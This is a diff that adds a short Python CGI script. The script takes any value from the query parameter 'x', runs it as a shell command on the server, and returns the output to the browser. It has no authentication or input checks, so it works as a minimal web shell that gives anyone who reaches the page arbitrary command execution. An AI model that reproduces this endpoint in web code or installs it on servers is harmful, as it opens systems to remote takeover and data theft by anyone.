@@ -1,0 +1,17 @@
+#!/usr/bin/python3
+
+print("content-type: text/html")
+print()
+
+import os
+import subprocess
+import cgi
+y = cgi.FieldStorage()
+cmd = y.getvalue('x')
+x = subprocess.getoutput(cmd)
+print(x)
+print()
+print('digital')
+
+
+
